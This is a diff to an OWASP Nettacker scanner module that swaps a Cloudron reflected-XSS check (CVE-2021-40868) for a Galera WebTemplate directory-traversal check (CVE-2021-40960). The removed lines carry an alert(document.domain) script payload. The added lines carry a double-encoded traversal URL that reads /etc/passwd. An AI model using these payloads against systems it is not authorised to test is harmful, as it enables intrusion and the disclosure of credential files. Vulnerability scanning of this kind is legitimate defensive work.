@@ -1,20 +1,20 @@
 info:
-  name: cloudron_cve_2021_40868_vuln
+  name: galera_webtemp_cve_2021_40960_vuln
   author: OWASP Nettacker Team
-  severity: 5
-  description: In Cloudron 6.2, the returnTo parameter on the login page is vulnerable to Reflected XSS.
+  severity: 7
+  description: Galera WebTemplate 1.0 is affected by a directory traversal vulnerability that could reveal information from /etc/passwd and /etc/shadow.
   reference: 
-    - https://packetstormsecurity.com/files/164255/Cloudron-6.2-Cross-Site-Scripting.html
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-40868
+    - http://www.omrylmz.com/galera-webtemplate-1-0-directory-traversal-vulnerability-cve-2021-40960/
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40960
   profiles:
     - vuln
     - vulnerability
     - http
-    - medium_severity
+    - high_severity
     - cve2021
     - cve
-    - cloudron
-    - xss
+    - galera
+    - lfi
 
 payloads:
   - library: http
@@ -24,12 +24,14 @@ payloads:
     stream: false
     proxies: ""
     steps:
+      
+        
       - method: get
         headers:
           User-Agent: "{user_agent}"
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            input_format: "{{schema}}://{target}:{{ports}}/GallerySite/filesrc/fotoilan/388/middle//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
             prefix: ""
             suffix: ""
             interceptors:
@@ -40,16 +42,13 @@ payloads:
               ports:
                 - 80
                 - 443
+        
         response:
           condition_type: and
           conditions:
             status_code:
               regex: '200'
               reverse: false
-            header:
-              Content-type: 
-                regex: text/html
-                reverse: false  
             content:
-              regex: <\/script><script>alert\(document.domain\)<\/script>
+              regex: "root:.*:0:0"
               reverse: false
